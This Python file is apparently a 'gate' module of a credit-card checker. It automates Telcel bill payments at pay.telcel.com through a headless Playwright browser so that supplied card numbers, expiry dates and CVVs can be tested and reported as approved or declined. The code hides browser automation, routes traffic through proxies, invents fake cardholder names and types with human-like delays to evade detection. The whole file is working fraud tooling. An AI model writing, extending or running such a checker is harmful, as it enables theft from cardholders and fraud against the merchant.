# Pure gate motor for 'facturas' — Telcel facturas (pay.telcel.com) bill pay via Playwright.
# Source: new_gates/facturas.py

import asyncio
import logging

from playwright.async_api import async_playwright

_GATEWAY = 'Telcel Facturas (pay.telcel.com)'

log = logging.getLogger(__name__)


async def _facturas_flow(num, mes, ano, cvv, number, proxy=None):
    mes = mes.zfill(2)
    ano = ano[-2:] if len(ano) == 4 else ano
    res = [None]
    launch_args = ['--disable-infobars', '--disable-blink-features=AutomationControlled',
                   '--no-sandbox', '--disable-dev-shm-usage', '--disable-web-security', '--disable-gpu']
    async with async_playwright() as p:
        async def handle_response(response):
            if 'api.claropay.com/be-portal-pagos/portalPagosRest/t1Payment' in response.url:
                try:
                    data = await response.json()
                    if isinstance(data, dict) and ('servicePaymentInfo' in data or 'responseMessage' in data):
                        res[0] = data
                except Exception:
                    pass

        if proxy:
            from urllib.parse import urlparse
            parsed = urlparse(proxy if '://' in proxy else f'http://{proxy}')
            proxies = {'server': f'{parsed.scheme}://{parsed.hostname}:{parsed.port}'}
            if parsed.username:
                proxies['username'] = parsed.username
                proxies['password'] = parsed.password
            browser = await p.chromium.launch(headless=True, proxy=proxies, args=launch_args)
        else:
            browser = await p.chromium.launch(headless=True, args=launch_args)

        context = await browser.new_context(permissions=['geolocation'], locale='es-MX')
        page = await context.new_page()
        try:
            await page.goto('https://pay.telcel.com/bills/2?rsd=1')
            await page.wait_for_load_state('networkidle')
            await page.fill('#id-phone-p', number)
            await page.get_by_role('button', name='Continuar').click()
            try:
                modal = await page.wait_for_selector('#id-content-modal', timeout=50000)
                if modal:
                    return {'status': True, 'success': False,
                            'response': 'Declined ❌ | Número inválido o no apto para factura, ingresa de nuevo'}
            except Exception:
                pass
            await page.wait_for_load_state('networkidle')
            prc = await page.locator("//div[contains(text(),'Total a pagar:')]/following::div[contains(text(),'$')]").first.inner_text()
            await page.get_by_role('button', name='Pagar').click()
            await page.locator('#creditCardNumber').fill(num)
            from faker import Faker
            fake = Faker('es_MX')
            name = f"{fake.first_name().replace('Dr. ', '')} {fake.last_name()}"
            await page.type('#creditCardName', delay=100, text=name)
            await page.locator('#month').fill(mes)
            await page.locator('#year').fill(ano)
            await page.type('#cvv-input', delay=120, text=cvv)
            await page.locator("button[type='submit']").click()
            m2 = page.locator('#id-content-modal')
            if await m2.is_visible():
                try:
                    await page.get_by_role('button', name='Continuar con mi tarjeta física').click()
                except Exception:
                    pass
            page.on('response', handle_response)
            for _ in range(60):
                if res[0]:
                    break
                await page.wait_for_timeout(700)
            if not res[0]:
                return {'status': True, 'success': False,
                        'response': 'Declined ❌ | No se recibió respuesta de la transacción, intenta de nuevo.'}
            data = res[0]
            srv = data.get('servicePaymentInfo') if isinstance(data, dict) else None
            auth = srv.get('authorizationId') if isinstance(srv, dict) else None
            if auth:
                folio_p = srv.get('folioProvisioning', 'NA')
                charge_date = srv.get('chargeDate', 'NA')
                return {'status': True, 'success': True,
                        'response': f'Approved ✅ | Pago de factura exitoso — {prc} | folio_telcel: {auth} | folio_motor: {folio_p} | fecha_cargo: {charge_date}'}
            msg = data.get('responseMessage', 'Transacción no procesada') if isinstance(data, dict) else 'Sin datos'
            return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg} | ({prc})'}
        except Exception as e:
            return {'status': False, 'raise': str(e)[:300]}
        finally:
            try:
                await browser.close()
            except Exception:
                pass


def _checker(cc, bin_data, number='', proxy=None):
    try:
        return asyncio.run(_facturas_flow(cc[0], cc[1], cc[2], cc[3], number=number, proxy=proxy))
    except Exception as e:
        return {'status': False, 'raise': str(e)[:300]}


def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    number = (ctx.get('number') or ctx.get('phone') or '').strip()
    proxy = (ctx.get('proxy') or '').strip()
    if not number:
        return {'status': 'Error ⚠️', 'response': 'facturas gate requiere parámetro number (10 dígitos)'}
    r = _checker(cc, bin_data, number=number, proxy=proxy)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}


if __name__ == '__main__':
    print(run_check(['4000222379753652', '09', '29', '938'], '', {'number': '2222222222'}))